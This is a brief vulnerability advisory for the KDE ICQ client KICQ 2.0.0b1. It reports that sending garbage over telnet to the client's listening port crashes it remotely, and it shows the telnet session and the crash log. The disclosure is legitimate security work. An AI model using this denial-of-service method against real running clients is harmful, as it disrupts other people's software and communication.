KICQ is an ICQ client, specifically designed for the KDE.

Versions affected:

    KICQ 2.0.0b1 using icqlib 1.0.0

Description

KICQ can be remotely crashed in a very simple way. Just telnet the machine on wich \
KICQ is running on the port it's bound and feed some garbage.

        bash-2.05$ telnet 10.0.0.1 1030
        Trying 10.0.0.1...
        Connected to 10.0.0.1.
        Escape character is '^]'.
        garbage
        Connection closed by foreign host.

KDE Crash handler window appears and something like this goes in the console:

   KCrash: crashing.... crashRecursionCounter = 2
   KCrash: Application Name = kicq path = <unknown>

I have tried to find where in the code the error ocurrs, but the exact place seems to \
change every time I execute KICQ.

Solution

I have contacted the developers and hope a patch is released soon.
